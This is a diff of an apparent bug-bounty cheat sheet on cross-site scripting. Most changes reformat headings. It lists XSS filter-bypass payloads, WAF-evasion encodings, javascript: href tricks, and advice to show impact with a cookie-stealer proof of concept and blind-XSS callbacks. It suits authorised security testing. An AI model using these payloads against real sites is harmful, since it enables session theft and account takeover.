@@ -11,29 +11,29 @@ Burpsuite allows you to customise scans, create a scan and remove all scans exce
 <br>
 Never submit a vulnerability with alert(1) show impact, use document.cookie and demonostrate a cookie stealer POC aslong as cookies are not set to httpONLY (not readable by javascript if set). <br>
 <br>
-**alert POC Alternatives**<br>
+<h2>alert POC Alternatives</h2>
 If alert is blocked or filtered, first try confirm(1), print() or prompt(1).<br>
 Try URL Encoding the A on alert - %61lert(1). URL each char if this does not work using referemce - https://www.w3schools.com/tags/ref_urlencode.ASP <br>
 You dont need a popup for a POC, you can go straight to a cookie stealer POC. <br>
 <br>
-**XSS Filter Bypasses** <br>
+<h2>XSS Filter Bypasses</h2> <br>
 Remove . from all payloads
 <code>Is <.script>alert(1)</script.> filtered? Try: <br>
 <scr<.script>ipt>alert(1)</scr</script.>ipt> <br>
 <.img src=x onerror=alert(1)> <br>
 <.svg/onload=alert(1)> <br>
-<h1 id=x onpointermove=alert(1)>test</h1> <br>
+<.h1 id=x onpointermove=alert(1)>test<./h1> <br>
 %3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E <br>
 <.randomfaketag id=x onwheel=alert(1)><br>
  <.a href=javascript:alert(1)>click</a.><br> </code>
 <br>
-**identify what is being blocked**
+ <h2>identify what is being blocked</h2>
 Can you submit a <.h1> tag but if using xss payload its blocked? Write out the xss payload removing elements at a time? maybe it gets blocked on alert(1) - if so use the alert bypass. Maybe it gets blocked on the event handler? If so copy event handlers to file and use on intruder to see what is allowed? <br>
 URL encode characters of the event handler one at a time and see if this successes. <br>
 is it being blocked due to the spaces? remove all spaces from the attack payload - <.svg/onload=alert(1)> - <.a/href= - <.h1 id=xonmouseover=alert(1)>test<./h1>
 <br>
 <br>
-**a href bypasses**<br>
+ <h2>a href bypasses</h2>
 If exploiting <a. href></a> xss and "javasript" is blocked by WAF or URL then try the below. <br>
 Add any number of \n \t or \r in the middle <br>
 java\nscript: <br>
@@ -54,7 +54,7 @@ Can also use the below to get rid of the word JavaScript all together<br>
 <br>
 
 
-<h1>Blind Xss</h1>
+<h2>Blind Xss</h2>
 Similar to Reflected Xss Or Stored Xss But you Dont get any reflection, but you get response on you server. <br>
 <br>
 Similar methods As given above except try putting payload which can give a callback on your server when executed. <br>
